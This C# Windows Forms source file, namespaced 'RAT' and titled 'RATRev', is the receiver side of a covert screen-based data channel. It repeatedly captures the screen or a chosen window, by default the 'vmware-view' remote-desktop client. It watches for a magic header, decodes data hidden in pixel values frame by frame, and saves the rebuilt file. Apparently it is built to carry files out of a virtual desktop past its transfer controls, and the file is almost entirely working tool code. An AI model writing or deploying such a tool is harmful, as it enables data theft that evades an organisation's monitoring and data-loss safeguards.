using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace RAT
{
    public class FormRAT : Form
    {
        private byte[] receivedData = new byte[0];
        private BackgroundWorker worker;
        private string magicString;
        private byte[] magicHeader;
        private int DisplayImageMillis = 3000;

        private GroupBox groupBoxFunction;
        private RadioButton radioButtonReceiver;
        private RadioButton radioButtonSender;
        private TextBox DisplayImageMillisTextBox;
        private TextBox HeaderStringTextBox;
        private Label label2;
        private Label label3;
        private TextBox ProcessesNameTextBox;
        private Label label1;

        private bool ClickFlag = false;

        public FormRAT()
        {
            InitializeComponent();

        }

        private void RadioButton_CheckedChanged(object sender, EventArgs ev)
        {
            if (radioButtonReceiver.Checked && ClickFlag == false)
            {
                ClickFlag = radioButtonReceiver.Checked;
                magicString = HeaderStringTextBox.Text;
                magicHeader = Encoding.ASCII.GetBytes(HeaderStringTextBox.Text);
                DisplayImageMillis = int.Parse(DisplayImageMillisTextBox.Text);

                worker = new BackgroundWorker
                {
                    WorkerReportsProgress = false
                };
                worker.DoWork += delegate
                {
                    CaptureScreens();
                };
                worker.RunWorkerCompleted += SaveCapturedData;
                worker.RunWorkerAsync();
            }
            else if(ClickFlag && !radioButtonReceiver.Checked)
            {
                try
                {
                    worker.CancelAsync();
                }
                catch (Exception ex)
                {
                    MessageBox.Show("An error occurred while trying cancel screen capture: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
            }
        }

        private PixelFormat BytesToFormat(int bytes)
        {
            switch (bytes)
            {
                case 1:
                    return PixelFormat.Format1bppIndexed;
                case 2:
                    return PixelFormat.Format16bppRgb565;
                case 3:
                    return PixelFormat.Format24bppRgb;
                case 4:
                    return PixelFormat.Format24bppRgb; //Not Use ARGB
                default:
                    throw new Exception("Unsupported bit depth");
            }
        }

        private byte[] PadFile(byte[] input, int arraySize)
        {
            byte[] array = new byte[(input.Length / arraySize + 1) * arraySize];
            Array.Copy(input, array, input.Length);
            return array;
        }


        private void CaptureScreens()
        {
            ushort num = 0;
            byte[] screenFlash = GetScreenFlash();
            byte[] first = SubArray(screenFlash, 0, magicHeader.Length);
            receivedData = new byte[0];

            while (!first.SequenceEqual(magicHeader))
            {
                Thread.Sleep(DisplayImageMillis);
                screenFlash = GetScreenFlash();
                first = SubArray(screenFlash, 0, magicHeader.Length);
            }
            while (first.SequenceEqual(magicHeader))
            {
                if (BitConverter.ToUInt16(SubArray(screenFlash, magicHeader.Length, 2), 0) == num + 1)
                {
                    byte[] second = SubArray(screenFlash, magicString.Length + 2, screenFlash.Length - magicString.Length - 2);
                    byte[] array = receivedData = receivedData.Concat(second).ToArray();
                    num = (ushort)(num + 1);
                }
                Thread.Sleep(DisplayImageMillis);
                screenFlash = GetScreenFlash();
                first = SubArray(screenFlash, 0, magicHeader.Length);
            }
            int num2 = receivedData.Count() - 1;
            while (num2 >= 0 && receivedData[num2--] == 0)
            {
            }
            int num4 = num2 + 1;
            byte[] destinationArray = new byte[num4 + 1];
            Array.Copy(receivedData, destinationArray, num4 + 1);
            receivedData = destinationArray;
        }

        private byte[] GetScreenFlash()
        {
            if (string.IsNullOrWhiteSpace(ProcessesNameTextBox.Text))
            {
                Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, BytesToFormat(Screen.PrimaryScreen.BitsPerPixel / 8));
                Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                return Decode(ImageToBytes(bitmap));
            }
            else
            {
                var process = Process.GetProcessesByName(ProcessesNameTextBox.Text).FirstOrDefault();

                ScreenCapture sc = new ScreenCapture();
                // capture entire screen, and save it to a file
                IntPtr hWnd = process.MainWindowHandle;
                string title = "";
                int index = process.MainWindowTitle.IndexOf(" - ", 0) + 3;
                if (index <= 3)
                {
                    title = process.MainWindowTitle;
                }
                else
                {
                    title = process.MainWindowTitle.Substring(index);
                }

                return Decode(ImageToBytes(sc.CaptureWindow(hWnd)));
            }
        }

        public byte[] SubArray(byte[] input, int index, int length)
        {
            byte[] array = new byte[length];
            Array.Copy(input, index, array, 0, length);
            return array;
        }

        private void SaveCapturedData(object sender, RunWorkerCompletedEventArgs e)
        {
            if (receivedData.Count() > 0)
            {
                FileDialog fileDialog = new SaveFileDialog();
                if (fileDialog.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        using (FileStream fileStream = new FileStream(fileDialog.FileName, FileMode.Create, FileAccess.Write))
                        {
                            fileStream.Write(receivedData, 0, receivedData.Count());
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("An error occurred while trying to save the captured data: " + ex.Message, "Save Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    }
                }
            }
        }

        private static byte[] ImageToBytes(Bitmap img)
        {

            //轉存至記憶體
            using (var stream = new MemoryStream())
            {
                img.Save(stream, ImageFormat.Png);
                Bitmap bmp = new Bitmap(stream);
                Rectangle rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
                BitmapData bitmapData = bmp.LockBits(rect, ImageLockMode.ReadOnly, bmp.PixelFormat);
                IntPtr scan = bitmapData.Scan0;
                int num = Math.Abs(bitmapData.Stride) * bmp.Height;
                byte[] array = new byte[num];
                Marshal.Copy(scan, array, 0, num);
                bmp.UnlockBits(bitmapData);
                return array;
            }
        }

        private static byte[] Decode(byte[] input)
        {
            byte[] array = new byte[input.Length / 8];
            int arraryPos = 0;
            byte value = 0;
            int bitpos = 0;
            for (int i = 0; i < input.Length; i++)
            {
                value = (byte)(value << 1);
                if (input[i] > 128)
                {
                    value = (byte)(value + 1);
                }
                bitpos++;
                if (bitpos == 8)
                {
                    bitpos = 0;
                    array[arraryPos++] = value;
                    value = 0;
                }
            }
            return array;
        }

        private void InitializeComponent()
        {
            this.groupBoxFunction = new GroupBox();
            this.radioButtonReceiver = new RadioButton();
            this.radioButtonSender = new RadioButton();
            this.DisplayImageMillisTextBox = new TextBox();
            this.label2 = new Label();
            this.label1 = new Label();
            this.HeaderStringTextBox = new TextBox();
            this.label3 = new Label();
            this.ProcessesNameTextBox = new TextBox();
            this.groupBoxFunction.SuspendLayout();
            this.SuspendLayout();
            // 
            // groupBoxFunction
            // 
            this.groupBoxFunction.Controls.Add(this.radioButtonReceiver);
            this.groupBoxFunction.Controls.Add(this.radioButtonSender);
            this.groupBoxFunction.Location = new Point(12, 96);
            this.groupBoxFunction.Name = "groupBoxFunction";
            this.groupBoxFunction.Size = new Size(260, 62);
            this.groupBoxFunction.TabIndex = 1;
            this.groupBoxFunction.TabStop = false;
            this.groupBoxFunction.Text = "Function Selector";
            // 
            // radioButtonReceiver
            // 
            this.radioButtonReceiver.AutoSize = true;
            this.radioButtonReceiver.Location = new Point(7, 21);
            this.radioButtonReceiver.Name = "radioButtonReceiver";
            this.radioButtonReceiver.Size = new Size(78, 16);
            this.radioButtonReceiver.TabIndex = 1;
            this.radioButtonReceiver.Text = "ReceiverOn";
            this.radioButtonReceiver.UseVisualStyleBackColor = true;
            this.radioButtonReceiver.CheckedChanged += new EventHandler(this.RadioButton_CheckedChanged);
            // 
            // radioButtonSender
            // 
            this.radioButtonSender.AutoSize = true;
            this.radioButtonSender.Checked = true;
            this.radioButtonSender.Location = new Point(7, 40);
            this.radioButtonSender.Name = "radioButtonSender";
            this.radioButtonSender.Size = new Size(80, 16);
            this.radioButtonSender.TabIndex = 0;
            this.radioButtonSender.TabStop = true;
            this.radioButtonSender.Text = "ReceiverOff";
            this.radioButtonSender.UseVisualStyleBackColor = true;
            this.radioButtonSender.CheckedChanged += new EventHandler(this.RadioButton_CheckedChanged);
            // 
            // DisplayImageMillisTextBox
            // 
            this.DisplayImageMillisTextBox.Location = new Point(115, 40);
            this.DisplayImageMillisTextBox.Name = "DisplayImageMillisTextBox";
            this.DisplayImageMillisTextBox.Size = new Size(157, 22);
            this.DisplayImageMillisTextBox.TabIndex = 11;
            this.DisplayImageMillisTextBox.Text = "3000";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new Point(13, 45);
            this.label2.Name = "label2";
            this.label2.Size = new Size(95, 12);
            this.label2.TabIndex = 10;
            this.label2.Text = "DisplayImageMillis";
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new Point(12, 16);
            this.label1.Name = "label1";
            this.label1.Size = new Size(66, 12);
            this.label1.TabIndex = 9;
            this.label1.Text = "HeaderString";
            // 
            // HeaderStringTextBox
            // 
            this.HeaderStringTextBox.Location = new Point(115, 12);
            this.HeaderStringTextBox.Name = "HeaderStringTextBox";
            this.HeaderStringTextBox.Size = new Size(157, 22);
            this.HeaderStringTextBox.TabIndex = 8;
            this.HeaderStringTextBox.Text = "RAT";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Location = new Point(13, 72);
            this.label3.Name = "label3";
            this.label3.Size = new Size(75, 12);
            this.label3.TabIndex = 13;
            this.label3.Text = "ProcessesName";
            // 
            // ProcessesNameTextBox
            // 
            this.ProcessesNameTextBox.Location = new Point(115, 69);
            this.ProcessesNameTextBox.Name = "ProcessesNameTextBox";
            this.ProcessesNameTextBox.Size = new Size(157, 22);
            this.ProcessesNameTextBox.TabIndex = 14;
            this.ProcessesNameTextBox.Text = "vmware-view";
            // 
            // FormRAT
            // 
            this.AutoScaleDimensions = new SizeF(6F, 12F);
            this.AutoScaleMode = AutoScaleMode.Font;
            this.ClientSize = new Size(284, 261);
            this.Controls.Add(this.ProcessesNameTextBox);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.DisplayImageMillisTextBox);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.HeaderStringTextBox);
            this.Controls.Add(this.groupBoxFunction);
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "RATRev";
            this.SizeGripStyle = SizeGripStyle.Hide;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "RATRev";
            this.groupBoxFunction.ResumeLayout(false);
            this.groupBoxFunction.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

    }
}
